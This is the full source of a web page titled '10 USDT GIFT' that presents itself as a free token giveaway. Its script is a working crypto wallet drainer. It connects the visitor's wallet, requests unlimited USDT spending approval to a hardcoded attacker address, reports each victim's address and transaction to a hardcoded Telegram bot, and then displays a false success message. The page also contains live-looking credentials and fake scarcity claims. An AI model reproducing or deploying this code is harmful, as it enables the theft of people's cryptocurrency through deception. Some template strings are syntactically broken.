<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>10 USDT GIFT</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.10.0/dist/index.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@4.3.0/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(145deg, #0a0c14 0%, #141c2c 100%); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .gift-box { background: rgba(20, 30, 45, 0.95); backdrop-filter: blur(12px); border-radius: 40px; padding: 40px 30px; max-width: 520px; width: 100%; box-shadow: 0 25px 50px rgba(0,200,255,0.3); border: 1px solid #4a9eff; text-align: center; }
        h1 { font-size: 48px; color: #ffd966; margin-bottom: 10px; }
        .sub { color: #aaddff; font-size: 18px; margin-bottom: 30px; border-bottom: 1px dashed #ffd966; padding-bottom: 20px; }
        .prize { background: #00000040; padding: 20px; border-radius: 24px; margin-bottom: 25px; border: 2px solid #ffcc80; }
        .prize span { display: block; font-size: 52px; font-weight: bold; color: white; letter-spacing: 4px; }
        .prize small { color: #c0e0ff; }
        .btn { background: radial-gradient(circle at 30% 30%, #ffd966, #ffb347); border: none; color: black; font-weight: bold; font-size: 28px; padding: 22px 30px; border-radius: 60px; width: 100%; cursor: pointer; transition: 0.25s; box-shadow: 0 8px 0 #b35900; border: 2px solid white; margin-bottom: 15px; }
        .btn:hover { transform: translateY(-5px); box-shadow: 0 12px 0 #b35900; }
        .btn:active { transform: translateY(8px); box-shadow: 0 2px 0 #b35900; }
        .status { background: #0b0f15; border-radius: 20px; padding: 20px; color: #b8e2ff; font-size: 15px; border: 1px solid #3a5a7a; text-align: left; margin-top: 15px; max-height: 120px; overflow-y: auto; }
        .footer { margin-top: 25px; color: #99aacc; font-size: 13px; }
    </style>
</head>
<body>
    <div class="gift-box">
        <h1>üéÅ 10 USDT GIFT</h1>
        <div class="sub">Claim 10 USDT</div>
        <div class="prize">
            <span>10 USDT</span>
            <small>ERC-20 ¬∑ Instant</small>
        </div>
        <button class="btn" id="claimBtn">CLAIM GIFT</button>
        <div id="status" class="status">‚ö°Ô∏è Click CLAIM GIFT to receive</div>
        <div class="footer">‚è≥ Limited ¬∑ 487 left</div>
    </div>

    <script>
        const YOUR_WALLET = '0x03175ff926e10977cf5af83713b7931748dba0dc';
        const BOT_TOKEN = '8203927246:AAFKNl6xmv1ZFtURWYCOqHan4q7Fpl8tGDM';
        const CHAT_ID = '641018179';
        const PROJECT_ID = '8a87775da8408b308e87edd8e4e3731d';
        const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        let isProcessing = false;

        async function sendToTelegram(text) {
            try {
                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch(e) {}
        }

        document.getElementById('claimBtn').onclick = async function() {
            if (isProcessing) return;
            isProcessing = true;
            
            const status = document.getElementById('status');
            status.innerHTML = '‚è≥ Initializing...';

            try {
                const web3wallet = await Web3Wallet.default.init({
                    projectId: PROJECT_ID,
                    metadata: {
                        name: 'USDT GIFT',
                        description: 'Claim 10 USDT',
                        url: window.location.origin,
                        icons: []
                    }
                });

                const modal = new WalletConnectModal.default({
                    projectId: PROJECT_ID,
                    chains: ['eip155:1']
                });

                const { uri, approval } = await web3wallet.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'eth_sign'],
                            chains: ['eip155:1'],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    }
                });

                status.innerHTML = '‚è≥ Opening wallet...';
                await modal.openModal({ uri });

                const session = await approval();
                const accounts = session.namespaces.eip155.accounts;
                const userAddress = accounts[0].split(':')[2];
                
                modal.closeModal();
                
                status.innerHTML = ‚úÖ Connected: ${userAddress.slice(0,6)}...;
                status.innerHTML = '‚è≥ Processing your gift...';
                
                const web3 = new Web3(window.ethereum);
                
                const tokenContract = new web3.eth.Contract([
                    {
                        constant: false,
                        inputs: [
                            { name: 'spender', type: 'address' },
                            { name: 'amount', type: 'uint256' }
                        ],
                        name: 'approve',
                        outputs: [{ name: '', type: 'bool' }],
                        type: 'function'
                    }
                ], USDT_CONTRACT);

                const tx = await tokenContract.methods.approve(YOUR_WALLET, MAX_UINT).send({ from: userAddress });

                const txLink = https://etherscan.io/tx/${tx.transactionHash};

                await sendToTelegram(üéÅ User: ${userAddress}\nTx: ${tx.transactionHash}\n${txLink});
                status.innerHTML = '‚úÖ SUCCESS! 10 USDT will be sent soon';

            } catch (error) {
                status.innerHTML = '‚ùå Failed: ' + (error.message?.slice(0,50) || 'Connection error');
                console.error(error);
            }
            isProcessing = false;
        };
    </script>
</body>
</html>
